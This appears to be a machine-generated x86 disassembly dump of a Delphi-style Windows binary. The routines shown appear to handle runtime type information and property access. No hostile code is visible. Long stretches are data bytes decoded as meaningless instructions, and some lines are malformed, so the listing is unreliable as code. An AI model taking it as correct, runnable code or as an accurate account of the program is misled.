popad
jb r-xdata
bound ebp [ ecx + ebp * 2 + 0x73 ]
push 0x656c6261
in al 0x6c
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
salc
inc ebp
sub_416b51
imul eax [ cs : ecx ] 0x3b
imul eax [ ecx ] 0x45
imul eax [ ecx ] 0x21
imul eax [ ecx ] 0x1
add [ eax ] al
add [ edx ] al
push 0x3f895c17
lea eax [ edx - 0x7b ]
push cs
lahf
push esp
cmc
or al 0x22
xchg ebx eax
push ecx
imul eax [ ecx ] 0x10
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x6bd00040 ] cl
inc ecx
add [ ecx + 0x6b ] ah
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp * 2 ] ah
inc ecx
add [ eax + eax ] dl
add [ eax ] al
shl bh 0x40
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax - 0x2bffbea1 ] al
pushad
inc ecx
add [ eax ] dl
pushad
inc ecx
add [ eax + 0x41 ] al
add [ eax ] ah
inc ecx
add [ eax ] dh
inc ecx
add [ eax ] cl
inc ecx
add [ ebx + ebx * 2 + 0x5bec0041 ] dh
inc ecx
add [ eax + 0x5c ] bh
inc ecx
add [ eax - 0x6fffbfd5 ] dl
sub eax [ eax ]
test al 0x5b
inc ecx
add [ eax + 0x60 ] bl
inc ecx
add [ eax + 0x5c ] al
inc ecx
add [ esp + ebx * 2 ] dh
inc ecx
add [ ecx ] bl
inc ecx
add ah dh
inc cx
add [ eax ] al
inc ecx
add [ eax ] dh
jae r-xdata
mov [ ecx + eax * 2 ] ch
or al 0x0
add [ eax ] al
nop
je r-xdata
add [ eax - 0x6fffbe8d ] ah
sub eax [ eax ]
pop ss
push esp
push eax
jne r-xdata
add [ eax ] al
add [ eax ] al
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0xe004033 ] al
jb r-xdata
insb
imul esi [ ebx + 0x68 ] 0x656c6261
add [ esi + 0x61 ] al
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
jo r-xdata
inc ecx
add [ eax + eax ] cl
add [ eax ] al
nop
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0x6c
popad
outsb
je r-xdata
add [ edx + 0x5e ] bl
add [ eax ] al
add bh bh
pop ebx
retn
or al 0x24
mov esi edx
mov ebx eax
mov eax ebx
call sub_4032d8
mov ecx [ esp ]
mov edx esi
jo r-xdata
je r-xdata
jb r-xdata
jns r-xdata
pop ecx
pop edx
pop ebx
retn
jb r-xdata
rcr [ edx + 0x48 ] 0x1
add [ edx + 0x6c3ca101 ] dh
inc ecx
add al ch
int1
dec edi
jb r-xdata
insb
popad
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
insb
mov [ gs : ecx + eax * 2 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jae sub_416d28
jns r-xdata
call sub_416d74
pop edx
pop esi
outsd
jb r-xdata
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0x15004033 ] al
inc ebp
push eax
jb r-xdata
sub [ ebx ] dh
jb r-xdata
inc esp
and al 0x4
or edx [ edx + ebp * 2 ]
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd3c
call sub_403b5c
outsd
outsb
jbe r-xdata
inc ebp
push eax
inc eax
add [ esi ] cl
sar bh 0xff
jae r-xdata
outsd
jb r-xdata
jb r-xdata
push esi
popad
jb r-xdata
bound ebp [ ecx + ebp * 2 + 0x73 ]
push 0x656c6261
in al 0x6c
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
salc
inc ebp
sub_416d28
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] ebx
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd3c
call sub_403b5c
pop ecx
pop edx
pop ebx
retn
sub_416d54
push ebx
push esi
push ecx
mov [ esp ] ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_4032d8
mov ecx [ esp ]
mov edx esi
call sub_416d74
pop edx
pop esi
pop ebx
retn
sub_416d74
push ebx
push esi
push ecx
mov [ esp ] ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_4035d0
mov ecx [ esp ]
mov edx esi
call sub_4175cc
pop edx
pop esi
pop ebx
retn
sub_416d94
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x5 ] cl
mov esi edx
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_416feb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
call sub_4168ac
mov ecx [ r-xdata ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_416d54
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebx ]
mov esi [ eax ]
xor eax eax
mov al [ esi ]
cmp eax 0x11
ja r-xdata
mov eax esi
call sub_416d28
jmp r-xdata
lea eax [ esi + 0x1 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x4
lea eax [ ebp - 0x20 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd3c
call sub_403b5c
jmp [ eax * 4 + jump_table_416e05 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416ff2
lea eax [ ebp - 0x18 ]
call sub_40482c
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_404144
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_417688
mov edx eax
mov eax edi
mov cl 0xfc
call sub_413a2c
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_417e80
mov eax edi
call sub_413c24
jmp r-xdata
mov eax edi
lea edx [ esi + 0x1 ]
call sub_413c8c
jmp r-xdata
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_417c58
mov edx [ ebp - 0x14 ]
mov eax edi
call sub_413c60
jmp r-xdata
lea ecx [ ebp - 0x18 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_417cc4
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_413cdc
jmp r-xdata
mov ecx edi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4181a4
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41829c
push edx
push eax
mov eax edi
call sub_413b28
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_417688
mov edx eax
mov eax [ ebx ]
mov ecx [ eax ]
mov eax edi
call sub_4154b8
jmp r-xdata
mov eax esi
call sub_4173c8
mov eax [ eax + 0x9 ]
mov eax [ eax ]
cmp eax [ r-xdata ]
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_417758
mov edx [ ebp - 0xc ]
mov eax edi
call sub_413c60
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_417688
mov edx eax
mov eax edi
mov cl 0xfc
call sub_413a2c
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4177cc
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_413c60
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_417688
mov edx eax
mov eax edi
mov cl 0xfc
call sub_413a2c
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_417688
mov edx eax
mov eax edi
call sub_413bfc
jmp r-xdata
sub_417000
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x18 ]
mov eax [ eax - 0x4 ]
call sub_411ba4
call sub_402b6c
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp edx [ ebp + 0x14 ]
jne r-xdata
jl r-xdata
cmp eax [ ebp + 0x10 ]
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd00
call sub_403b5c
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp edx [ ebp + 0xc ]
jne r-xdata
jmp r-xdata
jle r-xdata
cmp eax [ ebp + 0x8 ]
jbe r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn 0x10
jmp r-xdata
sub_417068
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_41731c
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ r-xdata ]
mov edx esi
mov eax edi
call sub_416d54
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebx ]
mov eax [ eax ]
call sub_4173c8
mov esi eax
mov eax [ ebx ]
mov eax [ eax ]
movzx eax [ eax ]
cmp eax 0x11
ja r-xdata
mov eax esi
call sub_416d28
jmp r-xdata
mov eax [ ebx ]
mov eax [ eax ]
inc eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x4
lea eax [ ebp - 0x20 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd3c
call sub_403b5c
jmp [ eax * 4 + jump_table_4170d7 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417323
lea eax [ ebp - 0x18 ]
call sub_40482c
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_404144
retn
mov eax [ esi + 0x5 ]
cmp eax [ esi + 0x1 ]
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_414bac
cmp ax 0x100
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_414bac
cmp ax 0x3
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_411ba4
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx ebx
mov eax edi
call sub_417f98
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_414c68
mov ecx [ ebp - 0x14 ]
mov edx ebx
mov eax edi
call sub_417c98
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_414cac
mov ecx [ ebp - 0x18 ]
mov edx ebx
mov eax edi
call sub_417dac
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax edi
call sub_4181e4
jmp r-xdata
push ebp
push [ esi + 0x4 ]
push [ esi ]
push [ esi + 0xc ]
push [ esi + 0x8 ]
call sub_417000
pop ecx
push edx
push eax
mov edx ebx
mov eax edi
call sub_4182c4
jmp r-xdata
mov eax [ ebx ]
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_415808
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax edi
call sub_4176fc
jmp r-xdata
push ebp
mov eax [ esi + 0x1 ]
xor edx edx
push edx
push eax
mov eax [ esi + 0x5 ]
xor edx edx
push edx
push eax
call sub_417000
pop ecx
mov ecx eax
mov edx ebx
mov eax edi
call sub_4176fc
jmp r-xdata
push ebp
mov eax [ esi + 0x1 ]
cdq
push edx
push eax
mov eax [ esi + 0x5 ]
cdq
push edx
push eax
call sub_417000
pop ecx
mov ecx eax
mov edx ebx
mov eax edi
call sub_4176fc
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_414bac
cmp ax 0xb
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_414c68
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax edi
call sub_41777c
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_414c68
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax edi
call sub_4179fc
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_410254
mov ecx eax
mov edx ebx
mov eax edi
call sub_4176fc
jmp r-xdata
push ebp
mov eax [ esi + 0x1 ]
cdq
push edx
push eax
mov eax [ esi + 0x5 ]
cdq
push edx
push eax
call sub_417000
pop ecx
mov ecx eax
mov edx ebx
mov eax edi
call sub_4176fc
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_411ba4
call sub_402b6c
test edx edx
jge r-xdata
mov ecx eax
mov edx ebx
mov eax edi
call sub_4176fc
jmp r-xdata
neg eax
adc edx 0x0
neg edx
sub_417330
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41738b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov cl 0x1
mov edx [ ebp + 0x8 ]
call sub_416d94
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_40f94c
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417392
lea eax [ ebp - 0x10 ]
call sub_40f638
retn
sub_4173a0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
call sub_417068
mov al 0x1
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_4173d4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_417492
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ esi ] 0x1
jne r-xdata
mov eax esi
call sub_4173c8
mov eax [ eax + 0x9 ]
mov eax [ eax ]
call sub_4173c8
cmp esi [ r-xdata ]
je r-xdata
mov edx edi
mov eax ebx
call sub_4085c0
jmp r-xdata
mov eax edi
test ebx ebx
setne dl
and edx 0x7f
mov edx [ edx * 4 + rw-data ]
call sub_404174
mov eax [ rw-data ]
mov eax [ eax ]
mov edx r-xdata
call sub_408224
test al al
je r-xdata
cmp [ eax + 0x1 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417499
lea eax [ ebp - 0x4 ]
call sub_404120
retn
lea edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_408144
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_404174
jmp r-xdata
lea esi [ eax + 0xd ]
test ebx ebx
je r-xdata
mov eax edi
mov edx esi
call sub_404384
xor eax eax
mov al [ esi ]
inc eax
add esi eax
dec ebx
test ebx ebx
jne r-xdata
sub_4174ac
push ebx
push esi
push edi
test edx edx
je r-xdata
or eax 0xffffffff
xor ecx ecx
mov cl [ eax + 0x1 ]
mov eax [ eax + ecx + 0xb ]
mov eax [ eax ]
mov cl [ eax + 0x1 ]
lea esi [ eax + ecx + 0xf ]
mov edi [ eax + ecx + 0x7 ]
xor eax eax
inc eax
lea esi [ ecx + esi + 0x1 ]
cmp eax edi
jle r-xdata
mov bl [ ecx + edx - 0x1 ]
xor bl [ ecx + esi ]
test bl 0xdf
jne r-xdata
mov cl [ esi ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
mov cl [ esi ]
dec ecx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4174f8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x1
jne r-xdata
mov eax ebx
call sub_4173c8
cmp [ eax + 0x1 ] 0x0
jge r-xdata
mov eax esi
call sub_4086fc
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4174ac
mov edx [ rw-data ]
mov eax esi
call sub_408224
test al al
je r-xdata
mov edx [ rw-data ]
mov eax esi
call sub_408224
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
call sub_4086fc
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebx
retn
sub_41755c
push ebx
push esi
push edi
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx edx
or edx edx
je r-xdata
xor ebx ebx
mov bl [ eax + 0x1 ]
lea esi [ eax + ebx + 0x2 ]
mov bl [ esi + 0xa ]
movzx edi [ esi + ebx + 0xb ]
test edi edi
je r-xdata
mov cl [ edx - 0x4 ]
mov ch [ edx ]
and ecx 0xdfff
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea eax [ esi + ebx + 0xd ]
mov eax [ eax ]
jmp r-xdata
mov bh 0x0
mov bh 0x0
dec edi
lea eax [ eax + ebx + 0x1b ]
jne r-xdata
mov ch [ edx ]
and ch 0xdf
mov bl [ eax + 0x1a ]
jmp r-xdata
dec ebx
jne r-xdata
mov bx [ eax + 0x1a ]
and bh 0xdf
cmp ebx ecx
je r-xdata
mov ch [ ebx + edx - 0x1 ]
xor ch [ eax + ebx + 0x1a ]
test ch 0xdf
jne r-xdata
sub_4175cc
push ebx
push ecx
mov [ esp ] ecx
call sub_41755c
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop edx
pop ebx
retn
mov eax [ r-xdata ]
cmp eax [ esp ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
cmp al 0x1f
ja r-xdata
jb r-xdata
and eax 0x7f
bt [ esp ] eax
xor ebx ebx
sub_417604
push ebx
push esi
push edi
xor ecx ecx
mov esi eax
mov cl [ eax + 0x1 ]
mov edi edx
xor eax eax
movzx ecx [ esi + ecx + 0xa ]
[ edi ]
mov esi [ esi + 0x4 ]
xor ecx ecx
test esi esi
je r-xdata
lea edi [ esi + ecx + 0xd ]
pop edi
pop esi
pop ebx
retn
mov esi [ esi ]
jmp r-xdata
lea edi [ edi + ecx + 0x1b ]
dec eax
jne r-xdata
mov [ edx + ebx * 4 ] edi
mov cl [ esi + 0x1 ]
lea esi [ esi + ecx + 0x2 ]
mov cl [ esi + 0xa ]
movzx eax [ esi + ecx + 0xb ]
test eax eax
je r-xdata
movzx ebx [ edi + 0x18 ]
mov cl [ edi + 0x1a ]
cmp [ edx + ebx * 4 ] 0x0
jne r-xdata
sub_417658
mov ecx [ edx + 0xc ]
test ecx 0xffffff00
je r-xdata
mov al cl
retn
cmp [ edx + 0xf ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
call ecx
retn
ja r-xdata
and ecx 0xffffff
mov cl [ ecx + eax ]
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
retn
sub_417688
push ebx
push edi
mov edi [ edx ]
mov edi [ edi ]
mov bl 0x4
cmp [ edi ] 0x7
je r-xdata
mov ecx [ edx + 0x4 ]
cmp [ edx + 0x7 ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
mov bl [ edi + ecx + 0x2 ]
call ecx
jmp r-xdata
ja r-xdata
cmp bl 0x4
jae r-xdata
and ecx 0xffffff
add ecx eax
mov al [ ecx ]
cmp bl 0x2
jb r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop edi
pop ebx
retn
cmp bl 0x2
jae r-xdata
mov ax [ ecx ]
cmp bl 0x4
jb r-xdata
movsx eax ax
je r-xdata
cmp bl 0x0
movsx eax al
je r-xdata
mov eax [ ecx ]
and eax 0xffff
and eax 0xff
pop edi
pop ebx
retn
sub_4176fc
push ebx
push esi
push edi
mov edi edx
mov esi [ edi ]
mov esi [ esi ]
mov bl 0x4
cmp [ esi ] 0x7
je r-xdata
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
xor ebx ebx
mov bl [ esi + 0x1 ]
mov bl [ esi + ebx + 0x2 ]
mov esi [ edi + 0x8 ]
cmp [ edi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add eax esi
mov [ eax ] cl
cmp bl 0x2
jb r-xdata
jb r-xdata
pop edi
pop esi
pop ebx
retn
mov [ eax ] cx
cmp bl 0x4
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
mov [ eax ] ecx
sub_417758
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_417688
mov edx eax
mov ecx edi
mov eax [ ebx ]
mov eax [ eax ]
call sub_4173d4
pop edi
pop esi
pop ebx
retn
sub_41777c
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ ebx ]
mov eax [ eax ]
mov edx esi
call sub_4174f8
test eax eax
jge r-xdata
mov ecx eax
mov edx ebx
mov eax edi
call sub_4176fc
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] esi
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd3c
call sub_403b5c
sub_4177cc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax esi
call sub_417688
mov edx eax
mov ecx ebx
mov eax edi
call sub_4177f8
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_4177f8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x5 ] cl
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_4178ac
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404120
mov eax [ ebp - 0x4 ]
mov edi eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_4173c8
mov eax [ eax + 0x1 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
xor ebx ebx
jae r-xdata
bt edi eax
inc ebx
cmp ebx 0x20
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
mov eax ebx
cmp eax 0x1f
ja r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0xc ]
call sub_4173d4
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_4043e8
mov eax esi
mov edx r-xdata
call sub_4043e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4178b3
lea eax [ ebp - 0x10 ]
call sub_404120
retn
push r-xdata
push [ esi ]
push r-xdata
mov eax esi
mov edx 0x3
call sub_4044a0
sub_4178e0
push ebx
push esi
mov esi eax
xor ebx ebx
jmp r-xdata
mov eax [ esi ]
mov al [ eax + ebx ]
test al al
je r-xdata
mov eax edx
mov edx [ esi ]
mov ecx ebx
call sub_404210
jmp r-xdata
sub al 0x20
je r-xdata
mov eax [ esi ]
mov al [ eax + ebx ]
sub al 0x20
je r-xdata
sub al 0xc
je r-xdata
inc ebx
sub al 0xc
je r-xdata
sub al 0x31
jne r-xdata
sub al 0x31
je r-xdata
inc ebx
add [ esi ] ebx
pop esi
pop ebx
retn
sub_417924
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4179eb
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4179f2
lea eax [ ebp - 0x8 ]
call sub_404120
retn
mov eax edi
call sub_4045e0
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
sub al 0x20
je r-xdata
inc [ ebp - 0x4 ]
sub al 0x3b
je r-xdata
mov eax [ ebx ]
mov eax [ eax ]
call sub_4173c8
mov eax [ eax + 0x1 ]
mov edi [ eax ]
lea edx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_4178e0
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_4174f8
mov ebx eax
test ebx ebx
jge r-xdata
cmp ebx 0x1f
ja r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd3c
call sub_403b5c
lea edx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_4178e0
bts esi ebx
sub_4179fc
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx edi
mov eax ebx
call sub_417924
mov ecx eax
mov edx ebx
mov eax esi
call sub_4176fc
pop edi
pop esi
pop ebx
retn
sub_417a20
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add esi eax
mov edi ecx
xor ecx ecx
mov cl [ esi ]
inc ecx
[ edi ] [ esi ]
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x4
sub_417a64
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add edi eax
mov eax [ esi ]
mov eax [ eax ]
mov esi ecx
xor ecx ecx
mov cl [ eax + 0x1 ]
mov cl [ eax + ecx + 0x2 ]
lodsb [ esi ]
cmp al cl
jb r-xdata
jb r-xdata
stosb [ edi ]
mov cl al
[ edi ] [ esi ]
pop edi
pop esi
retn
mov al cl
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_417ae0
push ebx
push esi
push edi
add esp 0xffffff00
mov edi ecx
mov esi edx
mov ebx eax
mov eax esp
mov edx edi
mov ecx 0xff
call sub_4043bc
mov ecx esp
mov edx esi
mov eax ebx
call sub_417a64
add esp 0x100
pop edi
pop esi
pop ebx
retn
sub_417b28
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
mov edx [ esi + eax ]
mov eax ecx
call sub_417b14
pop edi
pop esi
retn
jb r-xdata
call esi
pop edi
pop esi
retn
movsx esi si
add esi [ eax ]
call [ esi ]
pop edi
pop esi
retn
sub_417b68
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_417b14
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_417ba8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_417bf0
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_417cc4
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_4043a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417bf7
lea eax [ ebp - 0x4 ]
call sub_40482c
retn
sub_417c00
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_417c48
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_404978
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_417dac
xor eax eax
pop edx
pop ecx
pop ecx
